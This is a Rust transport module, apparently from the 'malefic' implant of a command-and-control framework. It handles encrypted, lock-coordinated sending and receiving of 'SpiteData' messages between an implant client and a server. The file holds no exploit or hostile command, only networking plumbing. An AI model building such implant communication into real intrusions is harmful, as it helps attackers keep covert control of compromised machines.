pub mod dialer;

#[cfg(feature = "bind")]
pub mod listener;
pub mod conn;

use futures::{AsyncRead, AsyncWrite, FutureExt, join};
use async_std::task::sleep;
use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use std::io;
use thiserror::Error;
use anyhow::{Result};
use malefic_helper::debug;
use malefic_proto::parser::{parser_header, SpiteData, HEADER_LEN};
use malefic_proto::crypto::{Cryptor, CryptorError};
use conn::Transport;



#[derive(Error, Debug)]
pub enum TransportError {
    #[error(transparent)]
    AnyHowError(#[from] anyhow::Error),

    #[error("Failed to connect to the server")]
    ConnectionError,

    #[error("Failed to encrypt/decrypt data")]
    CryptorError(#[from] CryptorError),

    #[error("Failed to send data")]
    SendError,

    #[error("Failed to send data within the timeout")]
    SendTimeout,

    #[error("Failed to receive data")]
    RecvError,

    #[error("I/O Error: {0}")]
    IoError(#[from] io::Error), // 转换标准库的 I/O 错误

    #[error("Parser error: {0}")]
    ParserError(#[from] malefic_proto::parser::ParserError),

    #[error("Unexpected end of stream")]
    UnexpectedEof,

    #[error("Unknown error occurred")]
    UnknownError,
}



#[async_trait]
pub trait TransportTrait: AsyncRead + AsyncWrite + Send + Sync + Sized {
    async fn recv(&mut self, len: usize) -> Result<Vec<u8>>;
    async fn send(&mut self, data: Vec<u8>) -> Result<usize>;
    async fn close(&mut self) -> Result<bool>;
}

#[derive(Clone)]
pub struct SafeTransport {
    pub transport: Transport,
    pub write_lock: Arc<async_std::sync::Mutex<bool>>,
    pub read_lock: Arc<async_std::sync::Mutex<bool>>,
}

impl SafeTransport{
    pub fn new(transport: Transport) -> Self {
        SafeTransport {
            transport,
            write_lock: Arc::new(async_std::sync::Mutex::new(false)),
            read_lock: Arc::new(async_std::sync::Mutex::new(false)),
        }
    }

    pub async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            async_std::task::sleep(Duration::from_millis(10)).await;
        }
    }

    pub async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn read_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.read_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            async_std::task::sleep(Duration::from_millis(10)).await;
        }
    }

    pub async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }
    
    pub async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
        let data = self.transport.recv(len).await?;
        Ok(data)
    }
    
    pub async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
        let n = self.transport.send(data).await?;
        Ok(n)
    }
    
    pub async fn close(&mut self) -> Result<bool> {
        let res = self.transport.close().await?;
        Ok(res)
    }
}

#[derive(Clone)]
pub struct Stream {
    pub cryptor: Cryptor,
}

impl Stream {
    pub async fn send(&mut self, mut transport: SafeTransport, data: Vec<u8>) -> Result<usize> {
        let data = self.cryptor.encrypt(data)?;
        transport.send(data).await
    }

    pub async fn recv(&mut self, mut transport: SafeTransport, len: usize) -> Result<Vec<u8>> {
        let data = transport.recv(len).await?;
        debug!("[transport] recv expect:{} {}", len, data.len());
        if data.len() != len {
            return Err(TransportError::RecvError.into());
        }
        Ok(self.cryptor.decrypt(data)?)
    }
}

#[derive(Clone)]
pub struct Client {
    pub stream: Stream,
    timeout : Duration,
}

impl Client {
    pub fn new(cryptor: Cryptor) -> Self {
        Client {
            stream: Stream { cryptor },
            timeout: Duration::from_secs(1),
        }
    }
    
    pub async fn handler(&mut self, mut transport: SafeTransport, data: SpiteData) -> Result<Option<SpiteData>> {
        self.stream.cryptor.reset();

        let mut sender = self.clone();
        let mut receiver = self.clone();
        let send_task = sender.send(transport.clone(), data).fuse();
        let recv_task = receiver.recv(transport.clone()).fuse();
        let (recv_result, send_result) = join!(recv_task, send_task);

        let _ = transport.close().await?;

        if let Err(e) = send_result {
            debug!("[client] send error: {:?}", e);
            return Err(e.into());
        }

        match recv_result {
            Ok(data) => Ok(Some(data)),
            Err(e) => {
                debug!("[client] recv error: {:?}", e);
                Ok(None)
            }
        }
    }

    pub async fn send(&mut self, transport: SafeTransport, data: SpiteData) -> Result<()> {
        let n = self.stream.send(transport.clone(), data.header()).await?;
        if n == 0 {
            return Err(TransportError::SendError.into());
        }

        debug!("[transport] send header success");
        let body = data.body();
        let n = self.stream.send(transport.clone(), body.clone()).await?;
        if n == body.len() {
            sleep(self.timeout).await;
            transport.write_over().await;
            debug!("[transport] send over");
            transport.read_wait().await.ok();
        } else {
            return Err(TransportError::SendError.into());
        }

        Ok(())
    }

    pub async fn recv(&mut self, transport: SafeTransport) -> Result<SpiteData> {
        futures::select! {
            res = self.stream.recv(transport.clone(), HEADER_LEN).fuse() => {
                match res {
                    Ok(response_data) if response_data.len() == HEADER_LEN => {
                        let mut spitedata = parser_header(&response_data)?;
                        debug!("[client] recv header success: {:?}, {}", response_data, spitedata.length);
                        let data = self.stream.recv(transport.clone(), spitedata.length as usize + 1).await?;
                        spitedata.set_data(data)?;
                        transport.read_over().await;
                        debug!("[client] recv over");
                        Ok(spitedata)
                    }
                    Ok(_) => {
                        debug!("[client] recv error: {:?}", res);
                        transport.read_over().await;
                        Err(TransportError::RecvError.into())
                    }
                    Err(e) => {
                        transport.read_over().await;
                        Err(e)
                    }
                }
            },
            _ = transport.write_wait().fuse() => {
                transport.read_over().await;
                Err(TransportError::SendTimeout.into())
            }
        }
    }
}
